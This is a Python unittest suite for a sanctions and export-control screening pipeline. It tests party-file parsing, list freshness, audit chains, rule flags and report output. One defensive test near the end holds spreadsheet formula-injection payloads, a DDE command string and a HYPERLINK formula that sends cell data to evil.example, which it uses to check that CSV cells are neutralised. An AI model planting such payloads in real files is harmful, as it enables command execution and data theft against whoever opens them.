import json
import shutil
import tempfile
import unittest
from datetime import date, datetime, timedelta, timezone
from pathlib import Path

from xscreen.audit import AuditLog
from xscreen.fetch import Manifest, load_manifest, refresh, staleness_check
from xscreen.pipeline import build_index, parse_party_file, run
from xscreen.report import markdown_report, summary_csv

FIX = Path(__file__).parent / "fixtures"


class TestPartyFileParsing(unittest.TestCase):
    def test_parses_the_fixture(self):
        subjects, warnings = parse_party_file((FIX / "parties.csv").read_text())
        self.assertEqual(len(subjects), 10)
        self.assertEqual(subjects[0].ref, "C-001")
        self.assertEqual(subjects[0].destination_country, "RU")

    def test_column_aliases(self):
        text = "customer_name,ship_to_country\nAcme Ltd,DE\n"
        subjects, _ = parse_party_file(text)
        self.assertEqual(subjects[0].name, "Acme Ltd")
        self.assertEqual(subjects[0].country, "DE")

    def test_missing_name_column_is_an_error_not_an_empty_run(self):
        subjects, warnings = parse_party_file("foo,bar\n1,2\n")
        self.assertEqual(subjects, [])
        self.assertTrue(any("no recognizable name column" in w for w in warnings))

    def test_blank_names_are_reported_not_silently_dropped(self):
        subjects, warnings = parse_party_file("name,country\nAcme,US\n,DE\nBeacon,FR\n")
        self.assertEqual(len(subjects), 2)
        self.assertTrue(any("Row 3" in w and "blank name" in w for w in warnings),
                        f"expected a row-numbered blank-name warning, got {warnings}")

    def test_unmapped_columns_are_surfaced(self):
        _, warnings = parse_party_file("name,internal_note\nAcme,hello\n")
        self.assertTrue(any("internal_note" in w for w in warnings))

    def test_aliases_split_on_semicolon_or_pipe(self):
        subjects, _ = parse_party_file("name,aka\nAcme,Acme Co;ACME Ltd|A Corp\n")
        self.assertEqual(len(subjects[0].aliases), 3)


class PipelineCase(unittest.TestCase):
    """Full offline run against the fixture lists."""

    def setUp(self):
        self.dir = Path(tempfile.mkdtemp())
        self.data = self.dir / "lists"
        self.data.mkdir(parents=True)
        for f in ("SDN.raw", "SDN_ALT.raw", "SDN_ADD.raw", "DPL.raw", "CSL.raw",
                  "NONSDN.raw"):
            shutil.copy(FIX / f, self.data / f)
        self.manifest = refresh(self.data, ("CSL", "SDN", "SDN_ALT", "SDN_ADD", "DPL", "NONSDN"), offline=True)
        self.audit = self.dir / "audit.jsonl"

    def tearDown(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def _run(self, **kw):
        subjects, _ = parse_party_file((FIX / "parties.csv").read_text())
        return run(subjects, self.data, self.audit, use_llm=False, use_critic=False,
                   as_of=date(2026, 1, 15), **kw)


class TestRefresh(PipelineCase):
    def test_manifest_records_hashes_and_counts(self):
        self.assertFalse(self.manifest.degraded, self.manifest.degraded_reason)
        self.assertGreater(self.manifest.total_parties, 0)
        for f in self.manifest.files:
            if f["code"] in ("SDN_ALT", "SDN_ADD"):
                continue
            self.assertEqual(len(f["sha256"]), 64, f["code"])

    def test_digest_is_reproducible(self):
        again = refresh(self.data, ("CSL", "SDN", "SDN_ALT", "SDN_ADD", "DPL", "NONSDN"), offline=True)
        self.assertEqual(again.digest, self.manifest.digest)

    def test_missing_source_marks_the_run_degraded(self):
        m = refresh(self.data, ("CSL", "SDN", "SDN_ALT", "NONSDN", "DPL", "MEU"), offline=True)
        self.assertTrue(m.degraded)
        self.assertIn("MEU", m.degraded_reason)

    def test_alias_merge_happened(self):
        parties = [json.loads(l) for l in (self.data / "parties.jsonl").read_text().splitlines()]
        northwind = [p for p in parties if p["uid"] == "SDN:1001"][0]
        self.assertIn("NORTHWIND HEAVY MACHINERY JSC", northwind["aliases"])


class TestStaleness(PipelineCase):
    def test_fresh_snapshot_passes(self):
        ok, msg = staleness_check(self.manifest)
        self.assertTrue(ok, msg)

    def test_old_snapshot_is_refused(self):
        old = datetime.now(timezone.utc) - timedelta(days=30)
        m = Manifest(created_at="", engine_version="", files=[
            {"code": "SDN", "fetched_at": old.isoformat(), "sha256": "x"}])
        ok, msg = staleness_check(m)
        self.assertFalse(ok)
        self.assertIn("days old", msg)

    def test_oldest_file_governs_not_the_newest(self):
        now = datetime.now(timezone.utc)
        m = Manifest(created_at="", engine_version="", files=[
            {"code": "SDN", "fetched_at": now.isoformat(), "sha256": "x"},
            {"code": "CSL", "fetched_at": (now - timedelta(days=40)).isoformat(), "sha256": "y"}])
        self.assertFalse(staleness_check(m)[0])

    def test_screening_refuses_a_stale_snapshot(self):
        stale = Manifest(created_at="", engine_version="", files=[
            {"code": "SDN", "fetched_at": (datetime.now(timezone.utc) - timedelta(days=99)).isoformat(),
             "sha256": "x"}], total_parties=1, digest="d")
        (self.data / "manifest.json").write_text(json.dumps(stale.to_dict()))
        subjects, _ = parse_party_file("name\nAcme\n")
        with self.assertRaises(RuntimeError) as ctx:
            run(subjects, self.data, self.audit, use_llm=False, use_critic=False)
        self.assertIn("Refusing to screen", str(ctx.exception))

    def test_override_is_recorded_in_the_audit_log(self):
        # Age the real refreshed manifest rather than fabricating one: a
        # fabricated manifest no longer reaches the staleness check at all,
        # because it cannot vouch for the corpus (no corpus_sha256) or its
        # coverage.
        p = self.data / "manifest.json"
        man = json.loads(p.read_text())
        for f in man["files"]:
            if f.get("fetched_at"):
                f["fetched_at"] = (
                    datetime.now(timezone.utc) - timedelta(days=99)).isoformat()
        p.write_text(json.dumps(man))
        subjects, _ = parse_party_file("name\nAcme\n")
        run(subjects, self.data, self.audit, use_llm=False, use_critic=False, allow_stale=True)
        starts = [e for e in AuditLog(self.audit).entries() if e["event"] == "run.start"]
        self.assertTrue(starts[-1]["payload"]["stale_override"])


class TestEndToEnd(PipelineCase):
    def setUp(self):
        super().setUp()
        self.results, self.summary = self._run()
        self.by_ref = {r.subject["ref"]: r for r in self.results}

    def test_every_subject_produced_a_result(self):
        self.assertEqual(len(self.results), 10)

    def test_known_hits_are_not_clear(self):
        for ref in ("C-001", "C-002", "C-004", "C-005", "C-007"):
            self.assertNotEqual(self.by_ref[ref].disposition, "CLEAR", ref)

    def test_sdn_exact_hit_is_a_confirmed_hit_without_any_model(self):
        r = self.by_ref["C-001"]
        self.assertEqual(r.top_band(), "EXACT")
        self.assertEqual(r.disposition, "CONFIRMED_HIT")
        self.assertIn("LIST.SDN", {f["rule_id"] for f in r.rule_flags})

    def test_expired_denial_order_is_not_treated_as_prohibitive(self):
        # C-008 Meridian's DPL order expired in 2023; run date is 2026.
        r = self.by_ref["C-008"]
        dpl = [f for f in r.rule_flags if f["rule_id"] == "LIST.DPL"]
        self.assertTrue(dpl)
        self.assertEqual(dpl[0]["severity"], "informational")

    def test_active_denial_order_is_prohibitive(self):
        r = self.by_ref["C-005"]
        dpl = [f for f in r.rule_flags if f["rule_id"] == "LIST.DPL"]
        self.assertEqual(dpl[0]["severity"], "prohibitive")

    def test_crimea_address_is_caught_despite_ukraine_country_code(self):
        r = self.by_ref["C-010"]
        self.assertIn("DEST.REGION", {f["rule_id"] for f in r.rule_flags})

    def test_transshipment_and_reluctance_flags_on_the_uae_intermediary(self):
        flags = {f["rule_id"] for f in self.by_ref["C-009"].rule_flags}
        self.assertIn("DEST.TRANSSHIP", flags)
        self.assertIn("KYC.RELUCTANT_END_USE", flags)
        self.assertIn("KYC.INTERMEDIARY", flags)

    def test_benign_party_is_flagged_only_by_the_unattested_policy(self):
        """A Canada-bound bakery has nothing wrong with it. The only thing
        standing between it and CLEAR is that nobody has attested the country
        policy file, so 'no entry for CA' cannot yet be read as 'no
        restriction for CA'."""
        r = self.by_ref["C-006"]
        flags = {f["rule_id"] for f in r.rule_flags}
        self.assertIn("DEST.NO_POLICY_ENTRY", flags)
        self.assertEqual(
            {f for f in flags if f.startswith(("LIST.", "DEST.COMPREHENSIVE",
                                               "DEST.EXTENSIVE", "DEST.ITAR"))},
            set(),
            "the benign party picked up a substantive restriction it should not have",
        )

    def test_attesting_the_policy_lets_a_benign_party_reach_clear(self):
        """The unattested-policy flag must be a gate an operator can clear,
        not permanent noise. Without this, CLEAR would be unreachable."""
        import json as _json
        from xscreen.rules import load_policy

        raw = _json.loads((Path(__file__).parents[1] / "policy" / "destinations.json")
                          .read_text(encoding="utf-8"))
        raw["verified_by"] = "test attester"
        raw["verified_on"] = "2026-01-15"
        attested = Path(self.dir) / "attested-policy.json"
        attested.write_text(_json.dumps(raw), encoding="utf-8")

        policy = load_policy(attested)
        self.assertTrue(policy.verified)

        from xscreen.pipeline import screen_subject
        index, manifest = build_index(self.data)
        subject = [s for s in parse_party_file((FIX / "parties.csv").read_text())[0]
                   if s.ref == "C-006"][0]
        r = screen_subject(subject, index, manifest, policy, date(2026, 1, 15))
        self.assertNotIn("DEST.NO_POLICY_ENTRY", {f["rule_id"] for f in r.rule_flags})
        self.assertEqual(r.disposition, "CLEAR")

    def test_no_llm_means_no_adjudications_asserted(self):
        for r in self.results:
            for a in r.adjudications:
                self.assertEqual(a["verdict"], "UNCERTAIN")

    def test_results_carry_provenance(self):
        for r in self.results:
            self.assertEqual(r.list_manifest_digest, self.manifest.digest)
            self.assertTrue(r.screened_at)


class TestAuditIntegration(PipelineCase):
    def test_run_is_bracketed_and_the_chain_verifies(self):
        self._run()
        log = AuditLog(self.audit)
        events = [e["event"] for e in log.entries()]
        self.assertEqual(events[0], "run.start")
        self.assertEqual(events[-1], "run.end")
        self.assertEqual(events.count("case.screened"), 10)
        intact, problems = log.verify()
        self.assertTrue(intact, problems)

    def test_list_hashes_are_in_the_audit_record(self):
        self._run()
        start = next(e for e in AuditLog(self.audit).entries() if e["event"] == "run.start")
        codes = {f["code"] for f in start["payload"]["list_files"]}
        self.assertIn("SDN", codes)
        self.assertTrue(all(f.get("sha256") for f in start["payload"]["list_files"]
                            if f["code"] not in ("SDN_ALT", "SDN_ADD")))

    def test_two_runs_extend_the_same_chain(self):
        self._run()
        self._run()
        log = AuditLog(self.audit)
        self.assertEqual(sum(1 for e in log.entries() if e["event"] == "run.start"), 2)
        self.assertTrue(log.verify()[0])


class TestDeterminismEndToEnd(PipelineCase):
    def test_two_deterministic_runs_agree_on_every_field_that_matters(self):
        a, _ = self._run()
        b, _ = self._run()
        def sig(rs):
            return [(r.subject["ref"], r.disposition, r.top_band(),
                     [(c["listed_uid"], c["band"], c["score"]) for c in r.candidates],
                     sorted(f["rule_id"] for f in r.rule_flags)) for r in rs]
        self.assertEqual(sig(a), sig(b))


class TestCriticLoopWiring(PipelineCase):
    """The critic's brief must reach the adjudicator PROMPT through the real
    pipeline wiring.

    The unit test on `run_loop` proves only that the loop hands the brief to
    `adjudicate_fn`; an earlier pipeline implementation accepted it there and
    stapled it onto the output after the model had answered, so with
    temperature-0 backends all four attempts sent byte-identical prompts and
    the advertised retry-to-improve control was inert.
    """

    def test_retry_prompts_carry_the_brief_and_differ_from_the_first(self):
        from xscreen.models import SubjectParty
        from xscreen.tests.test_guardrails import FakeBackend, adj_payload

        finding = "the dismissal rests on an address mismatch alone"
        worker = FakeBackend(adj_payload("SDN:1001", "DIFFERENT_PARTY", 0.9))
        critic = FakeBackend({
            "verdict": "FAIL", "risk_score": 0.9, "summary": "not convinced",
            "findings": [{"listed_uid": "SDN:1001", "severity": "major",
                          "finding": finding, "suggested_action": "recheck"}],
        })
        subjects = [SubjectParty(ref="C-1", name="Northwind Heavy Machinery")]
        results, _ = run(subjects, self.data, self.audit, use_llm=True,
                         use_critic=True, backend=worker, critic_backend=critic,
                         as_of=date(2026, 1, 15))

        prompts = [user for _, user in worker.calls]
        self.assertGreaterEqual(len(prompts), 2)
        self.assertNotIn("KNOWN_ISSUES", prompts[0])
        for p in prompts[1:]:
            self.assertIn("KNOWN_ISSUES", p)
            self.assertIn(finding, p)
        # A persistent FAIL still escalates to a human; the brief makes the
        # retry meaningful, it does not weaken the routing.
        self.assertEqual(results[0].disposition, "ESCALATE")
        self.assertTrue(results[0].requires_human)


class TestReporting(PipelineCase):
    def test_csv_has_a_row_per_subject(self):
        results, _ = self._run()
        rows = summary_csv(results).strip().splitlines()
        self.assertEqual(len(rows), 11)   # header plus ten

    def test_markdown_contains_provenance_and_limitations(self):
        results, summary = self._run()
        md = markdown_report(results, summary)
        self.assertIn("## Provenance and limitations", md)
        self.assertIn("50 Percent Rule", md)
        self.assertIn(summary["list_manifest_digest"], md)
        self.assertIn("Not legal advice", md)

    def test_markdown_flags_unverified_policy(self):
        results, summary = self._run()
        self.assertIn("NOT operator-verified", markdown_report(results, summary))

    def test_markdown_states_when_adjudication_was_disabled(self):
        results, summary = self._run()
        self.assertIn("every candidate routed to a human", markdown_report(results, summary))

    def test_csv_neutralizes_spreadsheet_formula_injection(self):
        # A counterparty is attacker-chosen text, and dispositions.csv is
        # opened in Excel by a compliance analyst. A leading = + - @ must not
        # survive as a live formula.
        import csv as _csv
        import io as _io
        from xscreen.models import ScreeningResult
        r = ScreeningResult(
            subject={"ref": "=cmd|' /C calc'!A0",
                     "name": '=HYPERLINK("http://evil.example/?x"&A1,"click")'},
            disposition="REVIEW", disposition_reason="test")
        rows = list(_csv.reader(_io.StringIO(summary_csv([r]))))
        header, body = rows[0], rows[1]
        for col in ("ref", "name"):
            cell = body[header.index(col)]
            self.assertTrue(cell.startswith("'"), cell)
        # Every parsed cell in every row must be inert.
        for row in rows[1:]:
            for cell in row:
                self.assertFalse(cell.startswith(("=", "+", "@", "\t")), cell)

    def test_pipe_characters_in_names_do_not_break_the_table(self):
        from xscreen.models import ScreeningResult
        r = ScreeningResult(subject={"ref": "X|1", "name": "Acme | Corp"},
                            disposition="REVIEW", disposition_reason="test")
        md = markdown_report([r], {"dispositions": {"REVIEW": 1}})
        self.assertIn("Acme \\| Corp", md)


if __name__ == "__main__":
    unittest.main()
